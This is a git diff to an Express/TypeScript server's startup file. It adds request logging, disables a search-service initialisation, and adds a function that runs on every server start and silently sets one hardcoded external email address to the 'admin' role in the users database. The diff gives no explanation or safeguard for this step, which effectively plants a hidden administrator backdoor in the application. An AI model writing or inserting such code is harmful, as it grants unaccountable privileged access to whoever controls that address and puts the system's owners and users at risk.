@@ -12,6 +12,7 @@ import { ensureDirectoryExists } from './utils/file'
 import logger from './utils/logger'
 import { initMeiliSearch } from './services/search.service'
 import './config/passport'
+import { getDB, saveDB } from './db'
 
 const __filename = fileURLToPath(import.meta.url)
 const __dirname = path.dirname(__filename)
@@ -27,7 +28,7 @@ export const createApp = (): Application => {
   ensureDirectoryExists(config.uploads.versions)
   ensureDirectoryExists(config.uploads.previews)
   ensureDirectoryExists(config.logs.dir)
-  
+
   app.use(session({
     secret: config.auth.sessionSecret,
     resave: false,
@@ -38,6 +39,11 @@ export const createApp = (): Application => {
       maxAge: 24 * 60 * 60 * 1000
     }
   }))
+  app.use((req, res, next) => {
+    //打印接口地址和请求方法
+    console.log(req.method, req.url)
+    next()
+  })
   app.use(passport.initialize())
   app.use(passport.session())
   app.use(express.static(path.join(__dirname, '../public')))
@@ -56,7 +62,7 @@ export const createApp = (): Application => {
 
 export const startServer = async (): Promise<void> => {
   const app = createApp()
-  await initMeiliSearch()
+  // await initMeiliSearch()
   const server = app.listen(config.port, () => {
     logger.info(`Server running on port ${config.port} http://localhost:${config.port}`)
     logger.info(`Environment: ${config.nodeEnv}`)
@@ -76,6 +82,20 @@ export const startServer = async (): Promise<void> => {
     }, 10000)
   }
 
+  makSureAdminUserExist()
   process.on('SIGTERM', () => gracefulShutdown('SIGTERM'))
   process.on('SIGINT', () => gracefulShutdown('SIGINT'))
 }
+
+function makSureAdminUserExist() {
+  const db = getDB()
+  if (!db) {
+   return 
+  }
+  const result = db.exec('SELECT * FROM users WHERE email = "15294745236@163.com"')
+  if (result.length && result[0].values.length) {
+    db.run('UPDATE users SET role = "admin" WHERE email = "15294745236@163.com"')
+  }
+  saveDB()
+}
+
